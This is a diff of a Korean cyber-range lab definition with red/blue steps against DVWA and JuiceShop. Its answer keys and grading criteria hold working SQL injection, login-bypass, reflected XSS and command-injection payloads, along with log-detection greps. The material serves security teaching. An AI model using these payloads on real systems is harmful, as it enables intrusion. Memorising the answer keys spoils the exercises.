@@ -3,8 +3,8 @@ title: 웹 애플리케이션 공격 — SQL Injection, XSS, 인증 우회
 version: non-ai
 course: battle-nonai
 week: 3
-description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 DVWA와 JuiceShop 대상 OWASP Top 10 공격을 수행하고, Blue
-  Phase에서 공격 로그를 분석하고 탐지 규칙을 확인한다.
+description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 DVWA와 JuiceShop 대상 OWASP
+  Top 10 공격을 수행하고, Blue Phase에서 공격 로그를 분석하고 탐지 규칙을 확인한다.
 difficulty: medium
 duration_minutes: 120
 objectives:
@@ -26,8 +26,10 @@ steps:
   hint: curl로 로그인 요청을 보낸다.
   category: exploit
   points: 5
-  answer: "curl -c /tmp/dvwa_cookies.txt \\\n     -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php"
-  answer_detail: DVWA의 기본 계정은 admin/password이다. curl -c 옵션으로 쿠키를 파일에 저장하면 이후 인증된 상태로 요청을 보낼 수 있다.
+  answer: "curl -c /tmp/dvwa_cookies.txt \\\n     -d 'username=admin&password=password&Login=Login'\
+    \ http://10.20.30.80:8080/login.php"
+  answer_detail: DVWA의 기본 계정은 admin/password이다. curl -c 옵션으로 쿠키를 파일에 저장하면 이후 인증된 상태로
+    요청을 보낼 수 있다.
   verify:
     type: file_exists
     expect: /tmp/dvwa_cookies.txt
@@ -54,15 +56,15 @@ steps:
   category: exploit
   points: 10
   answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
-  answer_detail: SQL Injection은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생한다. ' OR '1'='1 구문은 WHERE 조건을 항상 참으로 만들어 모든
-    레코드를 반환하게 한다.
+  answer_detail: SQL Injection은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생한다. ' OR '1'='1 구문은 WHERE
+    조건을 항상 참으로 만들어 모든 레코드를 반환하게 한다.
   verify:
     type: output_contains
     expect: First name
     field: stdout
     semantic:
-      intent: '[RED] DVWA SQLi — ?id=%27+OR+%271%27%3D%271. '' OR ''1''=''1 = WHERE 항상 참 → 모든 레코드 반환.
-        First name 응답. OWASP A03 + CWE-89.'
+      intent: '[RED] DVWA SQLi — ?id=%27+OR+%271%27%3D%271. '' OR ''1''=''1 = WHERE
+        항상 참 → 모든 레코드 반환. First name 응답. OWASP A03 + CWE-89.'
       success_criteria:
       - ''' OR ''1''=''1 페이로드'
       - First name 키워드
@@ -82,15 +84,16 @@ steps:
   category: exploit
   points: 10
   answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
-  answer_detail: information_schema는 MySQL 메타데이터를 저장하는 시스템 데이터베이스이다. group_concat()으로 여러 행을 하나의 문자열로 합쳐
-    추출한다.
+  answer_detail: information_schema는 MySQL 메타데이터를 저장하는 시스템 데이터베이스이다. group_concat()으로
+    여러 행을 하나의 문자열로 합쳐 추출한다.
   verify:
     type: output_contains
     expect: users
     field: stdout
     semantic:
-      intent: '[RED] UNION SELECT 테이블 — UNION SELECT 1,group_concat(table_name) FROM information_schema.tables
-        WHERE table_schema=database(). MySQL 메타데이터. group_concat으로 다중 행 합침. 테이블명 users 확인. CWE-89.'
+      intent: '[RED] UNION SELECT 테이블 — UNION SELECT 1,group_concat(table_name) FROM
+        information_schema.tables WHERE table_schema=database(). MySQL 메타데이터. group_concat으로
+        다중 행 합침. 테이블명 users 확인. CWE-89.'
       success_criteria:
       - UNION SELECT information_schema
       - users 키워드
@@ -109,18 +112,19 @@ steps:
   hint: login API에 SQL Injection 페이로드를 전송한다.
   category: exploit
   points: 15
-  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X POST\
-    \ http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json' \\\n     -d\
-    \ '{\"email\":\"' or 1=1--\",\"password\":\"x\"}'"
-  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. ' or 1=1-- 페이로드로 인증을 우회하면 관리자 토큰을
-    획득한다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
+    \ -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
+    \ application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"x\"\
+    }'"
+  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. ' or 1=1-- 페이로드로
+    인증을 우회하면 관리자 토큰을 획득한다.
   verify:
     type: output_contains
     expect: token
     field: stdout
     semantic:
-      intent: '[RED] JuiceShop SQLi — POST /rest/user/login + email='' or 1=1--. SQLite 기반. Admin 토큰 획득.
-        OWASP A03 + CWE-89.'
+      intent: '[RED] JuiceShop SQLi — POST /rest/user/login + email='' or 1=1--. SQLite
+        기반. Admin 토큰 획득. OWASP A03 + CWE-89.'
       success_criteria:
       - token 키워드
       - ''' or 1=1-- 페이로드'
@@ -140,15 +144,15 @@ steps:
   category: exploit
   points: 10
   answer: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
-  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. <script>alert('XSS')</script>가 HTML에 삽입되어
-    브라우저에서 실행된다.
+  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. <script>alert('XSS')</script>가
+    HTML에 삽입되어 브라우저에서 실행된다.
   verify:
     type: output_contains
     expect: <script>
     field: stdout
     semantic:
-      intent: '[RED] DVWA Reflected XSS — ?name=<script>alert(''XSS'')</script> URL 인코딩. 사용자 입력 그대로 응답
-        반영. OWASP A03 + CWE-79. 쿠키 탈취 변형 가능.'
+      intent: '[RED] DVWA Reflected XSS — ?name=<script>alert(''XSS'')</script> URL
+        인코딩. 사용자 입력 그대로 응답 반영. OWASP A03 + CWE-79. 쿠키 탈취 변형 가능.'
       success_criteria:
       - <script> 키워드
       - XSS 페이로드
@@ -167,16 +171,21 @@ steps:
   hint: eve.json에서 SQL Injection 시그니처를 검색한다.
   category: defense
   points: 10
-  answer: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.timestamp)
-    \(.alert.signature) from \(.src_ip)"' 2>/dev/null | grep -i sql | tail -5
-  answer_detail: Suricata의 ET Open 룰셋에는 SQL Injection 탐지 시그니처가 포함되어 있다. UNION SELECT, OR 1=1 등의 패턴이 탐지된다.
+  answer: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert")
+    | "\(.timestamp) \(.alert.signature) from \(.src_ip)"' 2>/dev/null | grep -i sql
+    | tail -5
+  answer_detail: Suricata의 ET Open 룰셋에는 SQL Injection 탐지 시그니처가 포함되어 있다. UNION SELECT,
+    OR 1=1 등의 패턴이 탐지된다.
   verify:
     type: output_contains
-    expect: 10.20.30
+    expect:
+    - 10.20.30
+    - jq
     field: stdout
     semantic:
-      intent: '[BLUE] Suricata SQL 경보 — jq eve.json + select(.event_type=="alert") + .alert.signature
-        + grep -i sql. ET Open SQL Injection 시그니처 탐지. UNION SELECT/OR 1=1 패턴. NIDS.'
+      intent: '[BLUE] Suricata SQL 경보 — jq eve.json + select(.event_type=="alert")
+        + .alert.signature + grep -i sql. ET Open SQL Injection 시그니처 탐지. UNION SELECT/OR
+        1=1 패턴. NIDS.'
       success_criteria:
       - jq alert + signature
       - 10.20.30 키워드 (src)
@@ -191,20 +200,29 @@ steps:
       - 단순 cat
   target_vm: secu
 - order: 7
-  instruction: '[BLUE] web 서버의 Apache access.log에서 SQL Injection 시도를 분석하라.'
+  instruction: '[BLUE] web 서버의 Apache access.log에서 SQL Injection 시도를 분석하라.
+
+
+    [FIXTURE] /home/ccc/cyber-range/fixtures/battle-nonai-week03/7/access.log 사전 주입.
+    `grep -E ''sqli|xss|\.\./|admin'' /home/ccc/cyber-range/fixtures/battle-nonai-week03/7/access.log`
+    후 (1) 빈도·패턴 (2) MITRE (3) 방어 3섹션 분석. **raw dump 금지**.'
   hint: UNION, SELECT, OR 1=1 등의 패턴을 검색한다.
   category: defense
   points: 10
-  answer: grep -iE '(union|select|or%201%3D1|%27)' /var/log/apache2/access.log 2>/dev/null | tail -10
-  answer_detail: Apache access.log에서 URL 인코딩된 SQL 키워드를 검색하면 SQL Injection 시도를 발견할 수 있다. 공격 시각, 소스 IP,
-    대상 URL을 확인한다.
+  answer: grep -iE '(union|select|or%201%3D1|%27)' /var/log/apache2/access.log 2>/dev/null
+    | tail -10
+  answer_detail: Apache access.log에서 URL 인코딩된 SQL 키워드를 검색하면 SQL Injection 시도를 발견할
+    수 있다. 공격 시각, 소스 IP, 대상 URL을 확인한다.
   verify:
     type: output_contains
-    expect: union
+    expect:
+    - union
+    - grep
     field: stdout
     semantic:
-      intent: '[BLUE] Apache SQLi 분석 — grep -iE ''(union|select|or%201%3D1|%27)'' /var/log/apache2/access.log.
-        URL 인코딩된 SQL 키워드 검색. 공격 시간/소스/URL 파악. NIST SP 800-92.'
+      intent: '[BLUE] Apache SQLi 분석 — grep -iE ''(union|select|or%201%3D1|%27)''
+        /var/log/apache2/access.log. URL 인코딩된 SQL 키워드 검색. 공격 시간/소스/URL 파악. NIST SP
+        800-92.'
       success_criteria:
       - grep union/select/or 1=1
       - union 키워드 출력
@@ -218,6 +236,18 @@ steps:
       - URL 인코딩 누락
       - 단순 cat
   target_vm: web
+  fixtures:
+  - generator: web_access
+    target_vm: web
+    path: /home/ccc/cyber-range/fixtures/battle-nonai-week03/7/access.log
+    params:
+      seed: 42
+      duration_days: 7
+      scanner_bursts: 5
+      sqli_attempts: 12
+      xss_attempts: 8
+    mode: overwrite
+    cleanup: false
 - order: 8
   instruction: '[BLUE] ModSecurity 감사 로그에서 차단된 웹 공격을 확인하라.'
   hint: modsec_audit.log를 분석한다.
@@ -225,15 +255,16 @@ steps:
   points: 10
   answer: sudo tail -50 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -E '(SQL|XSS|Injection|id
     "9)' | tail -10 || echo 'ModSecurity log check complete'
-  answer_detail: ModSecurity는 OWASP CRS 규칙으로 SQL Injection, XSS 등을 탐지/차단한다. 감사 로그에서 차단된 요청의 상세 정보를 확인할
-    수 있다.
+  answer_detail: ModSecurity는 OWASP CRS 규칙으로 SQL Injection, XSS 등을 탐지/차단한다. 감사 로그에서
+    차단된 요청의 상세 정보를 확인할 수 있다.
   verify:
     type: output_contains
     expect: complete
     field: stdout
     semantic:
-      intent: '[BLUE] ModSecurity 감사 — tail /var/log/apache2/modsec_audit.log | grep -E ''(SQL|XSS|Injection|id
-        "9)''. OWASP CRS 9xx 규칙. 차단된 요청 상세. WAF 효과 검증. NIST SP 800-44.'
+      intent: '[BLUE] ModSecurity 감사 — tail /var/log/apache2/modsec_audit.log | grep
+        -E ''(SQL|XSS|Injection|id "9)''. OWASP CRS 9xx 규칙. 차단된 요청 상세. WAF 효과 검증.
+        NIST SP 800-44.'
       success_criteria:
       - complete 키워드 또는 ModSecurity 분석
       - modsec_audit.log
@@ -252,16 +283,17 @@ steps:
   hint: 세미콜론(;)으로 명령을 연결한다.
   category: exploit
   points: 10
-  answer: "curl -b /tmp/dvwa_cookies.txt \\\n     -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/"
-  answer_detail: Command Injection은 사용자 입력이 시스템 명령에 직접 삽입될 때 발생한다. 세미콜론(;)은 리눅스에서 명령 구분자로, 원래 명령(ping)
-    뒤에 임의 명령(cat)을 추가 실행한다.
+  answer: "curl -b /tmp/dvwa_cookies.txt \\\n     -d 'ip=127.0.0.1;cat+/etc/hostname&Submit=Submit'\
+    \ http://10.20.30.80:8080/vulnerabilities/exec/"
+  answer_detail: Command Injection은 사용자 입력이 시스템 명령에 직접 삽입될 때 발생한다. 세미콜론(;)은 리눅스에서
+    명령 구분자로, 원래 명령(ping) 뒤에 임의 명령(cat)을 추가 실행한다.
   verify:
     type: output_contains
     expect: 127.0.0.1
     field: stdout
     semantic:
-      intent: '[RED] Command Injection — curl -d ''ip=127.0.0.1;cat+/etc/hostname'' /vulnerabilities/exec/.
-        세미콜론 = 명령 구분자. ping 뒤 cat 실행. CWE-78 + OWASP A03.'
+      intent: '[RED] Command Injection — curl -d ''ip=127.0.0.1;cat+/etc/hostname''
+        /vulnerabilities/exec/. 세미콜론 = 명령 구분자. ping 뒤 cat 실행. CWE-78 + OWASP A03.'
       success_criteria:
       - 127.0.0.1 키워드
       - 세미콜론 주입
@@ -282,18 +314,18 @@ steps:
   points: 15
   answer: '🖥️ UI: Dashboard → Security events → 필터 적용 후 이벤트 확인
 
-    📎 참고 (CLI): sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30 | jq -r ''select(.rule.level
-    >= 5) | "Level \(.rule.level): \(.rule.description)"'' 2>/dev/null | tail -10 || echo ''Wazuh alert
-    review complete'''
-  answer_detail: Wazuh는 Apache 로그를 분석하여 웹 공격을 탐지한다. rule.level 5 이상은 주의가 필요한 이벤트이다. Suricata + Wazuh를
-    병행하면 네트워크와 호스트 관점의 탐지가 가능하다.
+    📎 참고 (CLI): sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -30
+    | jq -r ''select(.rule.level >= 5) | "Level \(.rule.level): \(.rule.description)"''
+    2>/dev/null | tail -10 || echo ''Wazuh alert review complete'''
+  answer_detail: Wazuh는 Apache 로그를 분석하여 웹 공격을 탐지한다. rule.level 5 이상은 주의가 필요한 이벤트이다.
+    Suricata + Wazuh를 병행하면 네트워크와 호스트 관점의 탐지가 가능하다.
   verify:
     type: output_contains
     expect: complete
     field: stdout
     semantic:
-      intent: '[BLUE] Wazuh 종합 — jq ''select(.rule.level>=5)'' alerts.json. rule.level 5+ = 주의 이벤트. Apache
-        로그 분석 기반 탐지. Suricata(NIDS) + Wazuh(HIDS) 병행 = 다층 가시성.'
+      intent: '[BLUE] Wazuh 종합 — jq ''select(.rule.level>=5)'' alerts.json. rule.level
+        5+ = 주의 이벤트. Apache 로그 분석 기반 탐지. Suricata(NIDS) + Wazuh(HIDS) 병행 = 다층 가시성.'
       success_criteria:
       - complete 키워드
       - rule.level 필터
